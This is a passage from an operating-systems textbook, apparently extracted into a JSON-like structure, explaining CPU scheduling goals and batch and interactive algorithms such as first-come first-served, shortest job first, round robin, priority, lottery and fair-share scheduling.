clicking), not by\r\nthe rate the CPU can process it. Even compilations, a major sink of CPU cycles in\r\nthe past, take just a few seconds in most cases nowadays. Even when two programs\r\nare actually running at once, such as a word processor and a spreadsheet, it hardly\r\nmatters which goes first since the user is probably waiting for both of them to fin\u0002ish. As a consequence, scheduling does not matter much on simple PCs. Of\r\ncourse, there are applications that practically eat the CPU alive. For instance ren\u0002dering one hour of high-resolution video while tweaking the colors in each of the\r\n107,892 frames (in NTSC) or 90,000 frames (in PAL) requires industrial-strength\r\ncomputing power. Howev er, similar applications are the exception rather than the\r\nrule.\r\nWhen we turn to networked servers, the situation changes appreciably. Here\r\nmultiple processes often do compete for the CPU, so scheduling matters again. For\r\nexample, when the CPU has to choose between running a process that gathers the\r\ndaily statistics and one that serves user requests, the users will be a lot happier if\r\nthe latter gets first crack at the CPU.\r\nThe ‘‘abundance of resources’’ argument also does not hold on many mobile\r\ndevices, such as smartphones (except perhaps the most powerful models) and\r\nnodes in sensor networks. Here, the CPU may still be weak and the memory small.\r\nMoreover, since battery lifetime is one of the most important constraints on these\r\ndevices, some schedulers try to optimize the power consumption.\nSEC. 2.4 SCHEDULING 151\r\nIn addition to picking the right process to run, the scheduler also has to worry\r\nabout making efficient use of the CPU because process switching is expensive. To\r\nstart with, a switch from user mode to kernel mode must occur. Then the state of\r\nthe current process must be saved, including storing its registers in the process ta\u0002ble so they can be reloaded later. In some systems, the memory map (e.g., memory\r\nreference bits in the page table) must be saved as well. Next a new process must be\r\nselected by running the scheduling algorithm. After that, the memory management\r\nunit (MMU) must be reloaded with the memory map of the new process. Finally,\r\nthe new process must be started. In addition to all that, the process switch may\r\ninvalidate the memory cache and related tables, forcing it to be dynamically\r\nreloaded from the main memory twice (upon entering the kernel and upon leaving\r\nit). All in all, doing too many process switches per second can chew up a substan\u0002tial amount of CPU time, so caution is advised.\r\nProcess Behavior\r\nNearly all processes alternate bursts of computing with (disk or network) I/O\r\nrequests, as shown in Fig. 2-39. Often, the CPU runs for a while without stopping,\r\nthen a system call is made to read from a file or write to a file. When the system\r\ncall completes, the CPU computes again until it needs more data or has to write\r\nmore data, and so on. Note that some I/O activities count as computing. For ex\u0002ample, when the CPU copies bits to a video RAM to update the screen, it is com\u0002puting, not doing I/O, because the CPU is in use. I/O in this sense is when a proc\u0002ess enters the blocked state waiting for an external device to complete its work.\r\nLong CPU burst\r\nShort CPU burst\r\nWaiting for I/O\r\n(a) \r\n(b) \r\nTime\r\nFigure 2-39. Bursts of CPU usage alternate with periods of waiting for I/O.\r\n(a) A CPU-bound process. (b) An I/O-bound process.\r\nThe important thing to notice about Fig. 2-39 is that some processes, such as\r\nthe one in Fig. 2-39(a), spend most of their time computing, while other processes,\r\nsuch as the one shown in Fig. 2-39(b), spend most of their time waiting for I/O.\n152 PROCESSES AND THREADS CHAP. 2\r\nThe former are called compute-bound or CPU-bound; the latter are called I/O\u0002bound. Compute-bound processes typically have long CPU bursts and thus infre\u0002quent I/O waits, whereas I/O-bound processes have short CPU bursts and thus fre\u0002quent I/O waits. Note that the key factor is the length of the CPU burst, not the\r\nlength of the I/O burst. I/O-bound processes are I/O bound because they do not\r\ncompute much between I/O requests, not because they hav e especially long I/O re\u0002quests. It takes the same time to issue the hardware request to read a disk block no\r\nmatter how much or how little time it takes to process the data after they arrive.\r\nIt is worth noting that as CPUs get faster, processes tend to get more I/O\u0002bound. This effect occurs because CPUs are improving much faster than disks. As\r\na consequence, the scheduling of I/O-bound processes is likely to become a more\r\nimportant subject in the future. The basic idea here is that if an I/O-bound process\r\nwants to run, it should get a chance quickly so that it can issue its disk request and\r\nkeep the disk busy. As we saw in Fig. 2-6, when processes are I/O bound, it takes\r\nquite a few of them to keep the CPU fully occupied.\r\nWhen to Schedule\r\nA key issue related to scheduling is when to make scheduling decisions. It\r\nturns out that there are a variety of situations in which scheduling is needed. First,\r\nwhen a new process is created, a decision needs to be made whether to run the par\u0002ent process or the child process. Since both processes are in ready state, it is a nor\u0002mal scheduling decision and can go either way, that is, the scheduler can legiti\u0002mately choose to run either the parent or the child next.\r\nSecond, a scheduling decision must be made when a process exits. That proc\u0002ess can no longer run (since it no longer exists), so some other process must be\r\nchosen from the set of ready processes. If no process is ready, a system-supplied\r\nidle process is normally run.\r\nThird, when a process blocks on I/O, on a semaphore, or for some other rea\u0002son, another process has to be selected to run. Sometimes the reason for blocking\r\nmay play a role in the choice. For example, if A is an important process and it is\r\nwaiting for B to exit its critical region, letting B run next will allow it to exit its\r\ncritical region and thus let A continue. The trouble, however, is that the scheduler\r\ngenerally does not have the necessary information to take this dependency into ac\u0002count.\r\nFourth, when an I/O interrupt occurs, a scheduling decision may be made. If\r\nthe interrupt came from an I/O device that has now completed its work, some proc\u0002ess that was blocked waiting for the I/O may now be ready to run. It is up to the\r\nscheduler to decide whether to run the newly ready process, the process that was\r\nrunning at the time of the interrupt, or some third process.\r\nIf a hardware clock provides periodic interrupts at 50 or 60 Hz or some other\r\nfrequency, a scheduling decision can be made at each clock interrupt or at every\r\nkth clock interrupt. Scheduling algorithms can be divided into two categories with\nSEC. 2.4 SCHEDULING 153\r\nrespect to how they deal with clock interrupts. A nonpreemptive scheduling algo\u0002rithm picks a process to run and then just lets it run until it blocks (either on I/O or\r\nwaiting for another process) or voluntarily releases the CPU. Even if it runs for\r\nmany hours, it will not be forcibly suspended. In effect, no scheduling decisions\r\nare made during clock interrupts. After clock-interrupt processing has been fin\u0002ished, the process that was running before the interrupt is resumed, unless a\r\nhigher-priority process was waiting for a now-satisfied timeout.\r\nIn contrast, a preemptive scheduling algorithm picks a process and lets it run\r\nfor a maximum of some fixed time. If it is still running at the end of the time inter\u0002val, it is suspended and the scheduler picks another process to run (if one is avail\u0002able). Doing preemptive scheduling requires having a clock interrupt occur at the\r\nend of the time interval to give control of the CPU back to the scheduler. If no\r\nclock is available, nonpreemptive scheduling is the only option.\r\nCategories of Scheduling Algorithms\r\nNot surprisingly, in different environments different scheduling algorithms are\r\nneeded. This situation arises because different application areas (and different\r\nkinds of operating systems) have different goals. In other words, what the schedul\u0002er should optimize for is not the same in all systems. Three environments worth\r\ndistinguishing are\r\n1. Batch.\r\n2. Interactive.\r\n3. Real time.\r\nBatch systems are still in widespread use in the business world for doing payroll,\r\ninventory, accounts receivable, accounts payable, interest calculation (at banks),\r\nclaims processing (at insurance companies), and other periodic tasks. In batch sys\u0002tems, there are no users impatiently waiting at their terminals for a quick response\r\nto a short request. Consequently, nonpreemptive algorithms, or preemptive algo\u0002rithms with long time periods for each process, are often acceptable. This approach\r\nreduces process switches and thus improves performance. The batch algorithms\r\nare actually fairly general and often applicable to other situations as well, which\r\nmakes them worth studying, even for people not involved in corporate mainframe\r\ncomputing.\r\nIn an environment with interactive users, preemption is essential to keep one\r\nprocess from hogging the CPU and denying service to the others. Even if no proc\u0002ess intentionally ran forever, one process might shut out all the others indefinitely\r\ndue to a program bug. Preemption is needed to prevent this behavior. Servers also\r\nfall into this category, since they normally serve multiple (remote) users, all of\r\nwhom are in a big hurry. Computer users are always in a big hurry.\n154 PROCESSES AND THREADS CHAP. 2\r\nIn systems with real-time constraints, preemption is, oddly enough, sometimes\r\nnot needed because the processes know that they may not run for long periods of\r\ntime and usually do their work and block quickly. The difference with interactive\r\nsystems is that real-time systems run only programs that are intended to further the\r\napplication at hand. Interactive systems are general purpose and may run arbitrary\r\nprograms that are not cooperative and even possibly malicious.\r\nScheduling Algorithm Goals\r\nIn order to design a scheduling algorithm, it is necessary to have some idea of\r\nwhat a good algorithm should do. Some goals depend on the environment (batch,\r\ninteractive, or real time), but some are desirable in all cases. Some goals are listed\r\nin Fig. 2-40. We will discuss these in turn below.\r\nAll systems\r\nFair ness - giving each process a fair share of the CPU\r\nPolicy enforcement - seeing that stated policy is carried out\r\nBalance - keeping all parts of the system busy\r\nBatch systems\r\nThroughput - maximize jobs per hour\r\nTurnaround time - minimize time between submission and termination\r\nCPU utilization - keep the CPU busy all the time\r\nInteractive systems\r\nResponse time - respond to requests quickly\r\nPropor tionality - meet users’ expectations\r\nReal-time systems\r\nMeeting deadlines - avoid losing data\r\nPredictability - avoid quality degradation in multimedia systems\r\nFigure 2-40. Some goals of the scheduling algorithm under different circumstances.\r\nUnder all circumstances, fairness is important. Comparable processes should\r\nget comparable service. Giving one process much more CPU time than an equiv\u0002alent one is not fair. Of course, different categories of processes may be treated\r\ndifferently. Think of safety control and doing the payroll at a nuclear reactor’s\r\ncomputer center.\r\nSomewhat related to fairness is enforcing the system’s policies. If the local\r\npolicy is that safety control processes get to run whenever they want to, even if it\r\nmeans the payroll is 30 sec late, the scheduler has to make sure this policy is\r\nenforced.\r\nAnother general goal is keeping all parts of the system busy when possible. If\r\nthe CPU and all the I/O devices can be kept running all the time, more work gets\nSEC. 2.4 SCHEDULING 155\r\ndone per second than if some of the components are idle. In a batch system, for\r\nexample, the scheduler has control of which jobs are brought into memory to run.\r\nHaving some CPU-bound processes and some I/O-bound processes in memory to\u0002gether is a better idea than first loading and running all the CPU-bound jobs and\r\nthen, when they are finished, loading and running all the I/O-bound jobs. If the lat\u0002ter strategy is used, when the CPU-bound processes are running, they will fight for\r\nthe CPU and the disk will be idle. Later, when the I/O-bound jobs come in, they\r\nwill fight for the disk and the CPU will be idle. Better to keep the whole system\r\nrunning at once by a careful mix of processes.\r\nThe managers of large computer centers that run many batch jobs typically\r\nlook at three metrics to see how well their systems are performing: throughput,\r\nturnaround time, and CPU utilization. Throughput is the number of jobs per hour\r\nthat the system completes. All things considered, finishing 50 jobs per hour is bet\u0002ter than finishing 40 jobs per hour. Turnaround time is the statistically average\r\ntime from the moment that a batch job is submitted until the moment it is com\u0002pleted. It measures how long the average user has to wait for the output. Here the\r\nrule is: Small is Beautiful.\r\nA scheduling algorithm that tries to maximize throughput may not necessarily\r\nminimize turnaround time. For example, given a mix of short jobs and long jobs, a\r\nscheduler that always ran short jobs and never ran long jobs might achieve an ex\u0002cellent throughput (many short jobs per hour) but at the expense of a terrible\r\nturnaround time for the long jobs. If short jobs kept arriving at a fairly steady rate,\r\nthe long jobs might never run, making the mean turnaround time infinite while\r\nachieving a high throughput.\r\nCPU utilization is often used as a metric on batch systems. Actually though, it\r\nis not a good metric. What really matters is how many jobs per hour come out of\r\nthe system (throughput) and how long it takes to get a job back (turnaround time).\r\nUsing CPU utilization as a metric is like rating cars based on how many times per\r\nhour the engine turns over. Howev er, knowing when the CPU utilization is almost\r\n100% is useful for knowing when it is time to get more computing power.\r\nFor interactive systems, different goals apply. The most important one is to\r\nminimize response time, that is, the time between issuing a command and getting\r\nthe result. On a personal computer where a background process is running (for ex\u0002ample, reading and storing email from the network), a user request to start a pro\u0002gram or open a file should take precedence over the background work. Having all\r\ninteractive requests go first will be perceived as good service.\r\nA somewhat related issue is what might be called proportionality. Users have\r\nan inherent (but often incorrect) idea of how long things should take. When a re\u0002quest that the user perceives as complex takes a long time, users accept that, but\r\nwhen a request that is perceived as simple takes a long time, users get irritated. For\r\nexample, if clicking on an icon that starts uploading a 500-MB video to a cloud\r\nserver takes 60 sec, the user will probably accept that as a fact of life because he\r\ndoes not expect the upload to take 5 sec. He knows it will take time.\n156 PROCESSES AND THREADS CHAP. 2\r\nOn the other hand, when a user clicks on the icon that breaks the connection to\r\nthe cloud server after the video has been uploaded, he has different expectations. If\r\nit has not completed after 30 sec, the user will probably be swearing a blue streak,\r\nand after 60 sec he will be foaming at the mouth. This behavior is due to the com\u0002mon user perception that sending a lot of data is supposed to take a lot longer than\r\njust breaking the connection. In some cases (such as this one), the scheduler can\u0002not do anything about the response time, but in other cases it can, especially when\r\nthe delay is due to a poor choice of process order.\r\nReal-time systems have different properties than interactive systems, and thus\r\ndifferent scheduling goals. They are characterized by having deadlines that must or\r\nat least should be met. For example, if a computer is controlling a device that pro\u0002duces data at a regular rate, failure to run the data-collection process on time may\r\nresult in lost data. Thus the foremost need in a real-time system is meeting all (or\r\nmost) deadlines.\r\nIn some real-time systems, especially those involving multimedia, predictabil\u0002ity is important. Missing an occasional deadline is not fatal, but if the audio proc\u0002ess runs too erratically, the sound quality will deteriorate rapidly. Video is also an\r\nissue, but the ear is much more sensitive to jitter than the eye. To avoid this prob\u0002lem, process scheduling must be highly predictable and regular. We will study\r\nbatch and interactive scheduling algorithms in this chapter. Real-time scheduling\r\nis not covered in the book but in the extra material on multimedia operating sys\u0002tems on the book’s Website."
          },
          "2.4.2 Scheduling in Batch Systems": {
            "page": 187,
            "content": "2.4.2 Scheduling in Batch Systems\r\nIt is now time to turn from general scheduling issues to specific scheduling al\u0002gorithms. In this section we will look at algorithms used in batch systems. In the\r\nfollowing ones we will examine interactive and real-time systems. It is worth\r\npointing out that some algorithms are used in both batch and interactive systems.\r\nWe will study these later.\r\nFirst-Come, First-Served\r\nProbably the simplest of all scheduling algorithms ever devised is nonpreemp\u0002tive first-come, first-served. With this algorithm, processes are assigned the CPU\r\nin the order they request it. Basically, there is a single queue of ready processes.\r\nWhen the first job enters the system from the outside in the morning, it is started\r\nimmediately and allowed to run as long as it wants to. It is not interrupted because\r\nit has run too long. As other jobs come in, they are put onto the end of the queue.\r\nWhen the running process blocks, the first process on the queue is run next. When\r\na blocked process becomes ready, like a newly arrived job, it is put on the end of\r\nthe queue, behind all waiting processes.\nSEC. 2.4 SCHEDULING 157\r\nThe great strength of this algorithm is that it is easy to understand and equally\r\neasy to program. It is also fair in the same sense that allocating scarce concert\r\ntickets or brand-new iPhones to people who are willing to stand on line starting at\r\n2 A.M. is fair. With this algorithm, a single linked list keeps track of all ready proc\u0002esses. Picking a process to run just requires removing one from the front of the\r\nqueue. Adding a new job or unblocked process just requires attaching it to the end\r\nof the queue. What could be simpler to understand and implement?\r\nUnfortunately, first-come, first-served also has a powerful disadvantage. Sup\u0002pose there is one compute-bound process that runs for 1 sec at a time and many\r\nI/O-bound processes that use little CPU time but each have to perform 1000 disk\r\nreads to complete. The compute-bound process runs for 1 sec, then it reads a disk\r\nblock. All the I/O processes now run and start disk reads. When the com\u0002pute-bound process gets its disk block, it runs for another 1 sec, followed by all the\r\nI/O-bound processes in quick succession.\r\nThe net result is that each I/O-bound process gets to read 1 block per second\r\nand will take 1000 sec to finish. With a scheduling algorithm that preempted the\r\ncompute-bound process every 10 msec, the I/O-bound processes would finish in 10\r\nsec instead of 1000 sec, and without slowing down the compute-bound process\r\nvery much.\r\nShortest Job First\r\nNow let us look at another nonpreemptive batch algorithm that assumes the run\r\ntimes are known in advance. In an insurance company, for example, people can\r\npredict quite accurately how long it will take to run a batch of 1000 claims, since\r\nsimilar work is done every day. When several equally important jobs are sitting in\r\nthe input queue waiting to be started, the scheduler picks the shortest job first.\r\nLook at Fig. 2-41. Here we find four jobs A, B, C, and D with run times of 8, 4, 4,\r\nand 4 minutes, respectively. By running them in that order, the turnaround time for\r\nA is 8 minutes, for B is 12 minutes, for C is 16 minutes, and for D is 20 minutes for\r\nan average of 14 minutes.\r\n(a)\r\n8\r\nA\r\n4\r\nB\r\n4\r\nC\r\n4\r\nD\r\n(b)\r\n8\r\nA\r\n4\r\nB\r\n4\r\nC\r\n4\r\nD\r\nFigure 2-41. An example of shortest-job-first scheduling. (a) Running four jobs\r\nin the original order. (b) Running them in shortest job first order.\r\nNow let us consider running these four jobs using shortest job first, as shown\r\nin Fig. 2-41(b). The turnaround times are now 4, 8, 12, and 20 minutes for an aver\u0002age of 11 minutes. Shortest job first is provably optimal. Consider the case of four\n158 PROCESSES AND THREADS CHAP. 2\r\njobs, with execution times of a, b, c, and d, respectively. The first job finishes at\r\ntime a, the second at time a + b, and so on. The mean turnaround time is\r\n(4a + 3b + 2c + d)/4. It is clear that a contributes more to the average than the\r\nother times, so it should be the shortest job, with b next, then c, and finally d as the\r\nlongest since it affects only its own turnaround time. The same argument applies\r\nequally well to any number of jobs.\r\nIt is worth pointing out that shortest job first is optimal only when all the jobs\r\nare available simultaneously. As a counterexample, consider fiv e jobs, A through\r\nE, with run times of 2, 4, 1, 1, and 1, respectively. Their arrival times are 0, 0, 3, 3,\r\nand 3. Initially, only A or B can be chosen, since the other three jobs have not arri\u0002ved yet. Using shortest job first, we will run the jobs in the order A, B, C, D, E, for\r\nan average wait of 4.6. However, running them in the order B, C, D, E, A has an\r\nav erage wait of 4.4.\r\nShortest Remaining Time Next\r\nA preemptive version of shortest job first is shortest remaining time next.\r\nWith this algorithm, the scheduler always chooses the process whose remaining\r\nrun time is the shortest. Again here, the run time has to be known in advance.\r\nWhen a new job arrives, its total time is compared to the current process’ remain\u0002ing time. If the new job needs less time to finish than the current process, the cur\u0002rent process is suspended and the new job started. This scheme allows new short\r\njobs to get good service."
          },
          "2.4.3 Scheduling in Interactive Systems": {
            "page": 189,
            "content": "2.4.3 Scheduling in Interactive Systems\r\nWe will now look at some algorithms that can be used in interactive systems.\r\nThese are common on personal computers, servers, and other kinds of systems as\r\nwell.\r\nRound-Robin Scheduling\r\nOne of the oldest, simplest, fairest, and most widely used algorithms is round\r\nrobin. Each process is assigned a time interval, called its quantum, during which\r\nit is allowed to run. If the process is still running at the end of the quantum, the\r\nCPU is preempted and given to another process. If the process has blocked or fin\u0002ished before the quantum has elapsed, the CPU switching is done when the process\r\nblocks, of course. Round robin is easy to implement. All the scheduler needs to do\r\nis maintain a list of runnable processes, as shown in Fig. 2-42(a). When the proc\u0002ess uses up its quantum, it is put on the end of the list, as shown in Fig. 2-42(b).\r\nThe only really interesting issue with round robin is the length of the quantum.\r\nSwitching from one process to another requires a certain amount of time for doing\r\nall the administration—saving and loading registers and memory maps, updating\nSEC. 2.4 SCHEDULING 159\r\n(a)\r\nCurrent\r\nprocess\r\nNext\r\nprocess\r\nBFDGA\r\n(b)\r\nCurrent\r\nprocess\r\nFDGAB\r\nFigure 2-42. Round-robin scheduling. (a) The list of runnable processes.\r\n(b) The list of runnable processes after B uses up its quantum.\r\nvarious tables and lists, flushing and reloading the memory cache, and so on. Sup\u0002pose that this process switch or context switch, as it is sometimes called, takes 1\r\nmsec, including switching memory maps, flushing and reloading the cache, etc.\r\nAlso suppose that the quantum is set at 4 msec. With these parameters, after doing\r\n4 msec of useful work, the CPU will have to spend (i.e., waste) 1 msec on process\r\nswitching. Thus 20% of the CPU time will be thrown away on administrative over\u0002head. Clearly, this is too much.\r\nTo improve the CPU efficiency, we could set the quantum to, say, 100 msec.\r\nNow the wasted time is only 1%. But consider what happens on a server system if\r\n50 requests come in within a very short time interval and with widely varying CPU\r\nrequirements. Fifty processes will be put on the list of runnable processes. If the\r\nCPU is idle, the first one will start immediately, the second one may not start until\r\n100 msec later, and so on. The unlucky last one may have to wait 5 sec before get\u0002ting a chance, assuming all the others use their full quanta. Most users will per\u0002ceive a 5-sec response to a short command as sluggish. This situation is especially\r\nbad if some of the requests near the end of the queue required only a few millisec\u0002onds of CPU time. With a short quantum they would have gotten better service.\r\nAnother factor is that if the quantum is set longer than the mean CPU burst,\r\npreemption will not happen very often. Instead, most processes will perform a\r\nblocking operation before the quantum runs out, causing a process switch. Elimi\u0002nating preemption improves performance because process switches then happen\r\nonly when they are logically necessary, that is, when a process blocks and cannot\r\ncontinue.\r\nThe conclusion can be formulated as follows: setting the quantum too short\r\ncauses too many process switches and lowers the CPU efficiency, but setting it too\r\nlong may cause poor response to short interactive requests. A quantum around\r\n20–50 msec is often a reasonable compromise.\r\nPriority Scheduling\r\nRound-robin scheduling makes the implicit assumption that all processes are\r\nequally important. Frequently, the people who own and operate multiuser com\u0002puters have quite different ideas on that subject. At a university, for example, the\n160 PROCESSES AND THREADS CHAP. 2\r\npecking order may be the president first, the faculty deans next, then professors,\r\nsecretaries, janitors, and finally students. The need to take external factors into ac\u0002count leads to priority scheduling. The basic idea is straightforward: each proc\u0002ess is assigned a priority, and the runnable process with the highest priority is al\u0002lowed to run.\r\nEven on a PC with a single owner, there may be multiple processes, some of\r\nthem more important than others. For example, a daemon process sending elec\u0002tronic mail in the background should be assigned a lower priority than a process\r\ndisplaying a video film on the screen in real time.\r\nTo prevent high-priority processes from running indefinitely, the scheduler\r\nmay decrease the priority of the currently running process at each clock tick (i.e.,\r\nat each clock interrupt). If this action causes its priority to drop below that of the\r\nnext highest process, a process switch occurs. Alternatively, each process may be\r\nassigned a maximum time quantum that it is allowed to run. When this quantum is\r\nused up, the next-highest-priority process is given a chance to run.\r\nPriorities can be assigned to processes statically or dynamically. On a military\r\ncomputer, processes started by generals might begin at priority 100, processes\r\nstarted by colonels at 90, majors at 80, captains at 70, lieutenants at 60, and so on\r\ndown the totem pole. Alternatively, at a commercial computer center, high-priority\r\njobs might cost $100 an hour, medium priority $75 an hour, and low priority $50\r\nan hour. The UNIX system has a command, nice, which allows a user to voluntar\u0002ily reduce the priority of his process, in order to be nice to the other users. Nobody\r\nev er uses it.\r\nPriorities can also be assigned dynamically by the system to achieve certain\r\nsystem goals. For example, some processes are highly I/O bound and spend most\r\nof their time waiting for I/O to complete. Whenever such a process wants the CPU,\r\nit should be given the CPU immediately, to let it start its next I/O request, which\r\ncan then proceed in parallel with another process actually computing. Making the\r\nI/O-bound process wait a long time for the CPU will just mean having it around\r\noccupying memory for an unnecessarily long time. A simple algorithm for giving\r\ngood service to I/O-bound processes is to set the priority to 1/ f , where f is the frac\u0002tion of the last quantum that a process used. A process that used only 1 msec of its\r\n50-msec quantum would get priority 50, while a process that ran 25 msec before\r\nblocking would get priority 2, and a process that used the whole quantum would\r\nget priority 1.\r\nIt is often convenient to group processes into priority classes and use priority\r\nscheduling among the classes but round-robin scheduling within each class. Figure\r\n2-43 shows a system with four priority classes. The scheduling algorithm is as fol\u0002lows: as long as there are runnable processes in priority class 4, just run each one\r\nfor one quantum, round-robin fashion, and never bother with lower-priority classes.\r\nIf priority class 4 is empty, then run the class 3 processes round robin. If classes 4\r\nand 3 are both empty, then run class 2 round robin, and so on. If priorities are not\r\nadjusted occasionally, lower-priority classes may all starve to death.\nSEC. 2.4 SCHEDULING 161\r\nPriority 4\r\nPriority 3\r\nPriority 2\r\nPriority 1\r\nQueue\r\nheaders Runnable processes\r\n(Highest priority)\r\n(Lowest priority)\r\nFigure 2-43. A scheduling algorithm with four priority classes.\r\nMultiple Queues\r\nOne of the earliest priority schedulers was in CTSS, the M.I.T. Compatible\r\nTimeSharing System that ran on the IBM 7094 (Corbato´ et al., 1962). CTSS had\r\nthe problem that process switching was slow because the 7094 could hold only one\r\nprocess in memory. Each switch meant swapping the current process to disk and\r\nreading in a new one from disk. The CTSS designers quickly realized that it was\r\nmore efficient to give CPU-bound processes a large quantum once in a while, rath\u0002er than giving them small quanta frequently (to reduce swapping). On the other\r\nhand, giving all processes a large quantum would mean poor response time, as we\r\nhave already seen. Their solution was to set up priority classes. Processes in the\r\nhighest class were run for one quantum. Processes in the next-highest class were\r\nrun for two quanta. Processes in the next one were run for four quanta, etc. When\u0002ev er a process used up all the quanta allocated to it, it was moved down one class.\r\nAs an example, consider a process that needed to compute continuously for\r\n100 quanta. It would initially be given one quantum, then swapped out. Next time\r\nit would get two quanta before being swapped out. On succeeding runs it would\r\nget 4, 8, 16, 32, and 64 quanta, although it would have used only 37 of the final 64\r\nquanta to complete its work. Only 7 swaps would be needed (including the initial\r\nload) instead of 100 with a pure round-robin algorithm. Furthermore, as the proc\u0002ess sank deeper and deeper into the priority queues, it would be run less and less\r\nfrequently, saving the CPU for short, interactive processes.\r\nThe following policy was adopted to avoid punishing forever a process that\r\nneeded to run for a long time when it first started but became interactive later.\r\nWhenever a carriage return (Enter key) was typed at a terminal, the process be\u0002longing to that terminal was moved to the highest-priority class, on the assumption\r\nthat it was about to become interactive. One fine day, some user with a heavily\r\nCPU-bound process discovered that just sitting at the terminal and typing carriage\r\nreturns at random every few seconds did wonders for his response time. He told all\r\nhis friends. They told all their friends. Moral of the story: getting it right in prac\u0002tice is much harder than getting it right in principle.\n162 PROCESSES AND THREADS CHAP. 2\r\nShortest Process Next\r\nBecause shortest job first always produces the minimum average response time\r\nfor batch systems, it would be nice if it could be used for interactive processes as\r\nwell. To a certain extent, it can be. Interactive processes generally follow the pat\u0002tern of wait for command, execute command, wait for command, execute com\u0002mand, etc. If we regard the execution of each command as a separate ‘‘job,’’ then\r\nwe can minimize overall response time by running the shortest one first. The prob\u0002lem is figuring out which of the currently runnable processes is the shortest one.\r\nOne approach is to make estimates based on past behavior and run the process\r\nwith the shortest estimated running time. Suppose that the estimated time per com\u0002mand for some process is T0. Now suppose its next run is measured to be T1. We\r\ncould update our estimate by taking a weighted sum of these two numbers, that is,\r\naT0 + (1 − a)T1. Through the choice of a we can decide to have the estimation\r\nprocess forget old runs quickly, or remember them for a long time. With a = 1/2,\r\nwe get successive estimates of\r\nT0, T0/2 + T1/2, T0/4 + T1/4 + T2/2, T0/8 + T1/8 + T2/4 + T3/2\r\nAfter three new runs, the weight of T0 in the new estimate has dropped to 1/8.\r\nThe technique of estimating the next value in a series by taking the weighted\r\nav erage of the current measured value and the previous estimate is sometimes cal\u0002led aging. It is applicable to many situations where a prediction must be made\r\nbased on previous values. Aging is especially easy to implement when a = 1/2. All\r\nthat is needed is to add the new value to the current estimate and divide the sum by\r\n2 (by shifting it right 1 bit).\r\nGuaranteed Scheduling\r\nA completely different approach to scheduling is to make real promises to the\r\nusers about performance and then live up to those promises. One promise that is\r\nrealistic to make and easy to live up to is this: If n users are logged in while you are\r\nworking, you will receive about 1/n of the CPU power. Similarly, on a single-user\r\nsystem with n processes running, all things being equal, each one should get 1/n of\r\nthe CPU cycles. That seems fair enough.\r\nTo make good on this promise, the system must keep track of how much CPU\r\neach process has had since its creation. It then computes the amount of CPU each\r\none is entitled to, namely the time since creation divided by n. Since the amount of\r\nCPU time each process has actually had is also known, it is fairly straightforward\r\nto compute the ratio of actual CPU time consumed to CPU time entitled. A ratio\r\nof 0.5 means that a process has only had half of what it should have had, and a\r\nratio of 2.0 means that a process has had twice as much as it was entitled to. The\r\nalgorithm is then to run the process with the lowest ratio until its ratio has moved\r\nabove that of its closest competitor. Then that one is chosen to run next.\nSEC. 2.4 SCHEDULING 163\r\nLottery Scheduling\r\nWhile making promises to the users and then living up to them is a fine idea, it\r\nis difficult to implement. However, another algorithm can be used to give similarly\r\npredictable results with a much simpler implementation. It is called lottery\r\nscheduling (Waldspurger and Weihl, 1994).\r\nThe basic idea is to give processes lottery tickets for various system resources,\r\nsuch as CPU time. Whenever a scheduling decision has to be made, a lottery ticket\r\nis chosen at random, and the process holding that ticket gets the resource. When\r\napplied to CPU scheduling, the system might hold a lottery 50 times a second, with\r\neach winner getting 20 msec of CPU time as a prize.\r\nTo paraphrase George Orwell: ‘‘All processes are equal, but some processes\r\nare more equal.’’ More important processes can be given extra tickets, to increase\r\ntheir odds of winning. If there are 100 tickets outstanding, and one process holds\r\n20 of them, it will have a 20% chance of winning each lottery. In the long run, it\r\nwill get about 20% of the CPU. In contrast to a priority scheduler, where it is very\r\nhard to state what having a priority of 40 actually means, here the rule is clear: a\r\nprocess holding a fraction f of the tickets will get about a fraction f of the resource\r\nin question.\r\nLottery scheduling has several interesting properties. For example, if a new\r\nprocess shows up and is granted some tickets, at the very next lottery it will have a\r\nchance of winning in proportion to the number of tickets it holds. In other words,\r\nlottery scheduling is highly responsive.\r\nCooperating processes may exchange tickets if they wish. For example, when a\r\nclient process sends a message to a server process and then blocks, it may give all\r\nof its tickets to the server, to increase the chance of the server running next. When\r\nthe server is finished, it returns the tickets so that the client can run again. In fact,\r\nin the absence of clients, servers need no tickets at all.\r\nLottery scheduling can be used to solve problems that are difficult to handle\r\nwith other methods. One example is a video server in which several processes are\r\nfeeding video streams to their clients, but at different frame rates. Suppose that the\r\nprocesses need frames at 10, 20, and 25 frames/sec. By allocating these processes\r\n10, 20, and 25 tickets, respectively, they will automatically divide the CPU in\r\napproximately the correct proportion, that is, 10 : 20 : 25.\r\nFair-Share Scheduling\r\nSo far we have assumed that each process is scheduled on its own, without\r\nregard to who its owner is. As a result, if user 1 starts up nine processes and user 2\r\nstarts up one process, with round robin or equal priorities, user 1 will get 90% of\r\nthe CPU and user 2 only 10% of it.\r\nTo prevent this situation, some systems take into account which user owns a\r\nprocess before scheduling it. In this model, each user is allocated some fraction of\n164 PROCESSES AND THREADS CHAP. 2\r\nthe CPU and the scheduler picks processes in such a way as to enforce it. Thus if\r\ntwo users have each been promised 50% of the CPU, they will each get that, no\r\nmatter how many processes they hav e in existence.\r\nAs an example, consider a system with two users, each of which has been\r\npromised 50% of the CPU. User 1 has four processes, A, B, C, and D, and user 2\r\nhas only one process, E. If round-robin scheduling is used, a possible scheduling\r\nsequence that meets all the constraints is this one:\r\nA E B E C E D E A E B E C E D E ...\r\nOn the other hand, if user 1 is entitled to twice as much CPU time as user 2, we\r\nmight get\r\nA B E C D E A B E C D E ...\r\nNumerous other possibilities exist, of course, and can be exploited, depending on\r\nwhat the notion of fairness is."
          },
          "2.4.4 Scheduling in Real-Time Systems": {
            "page": 195,
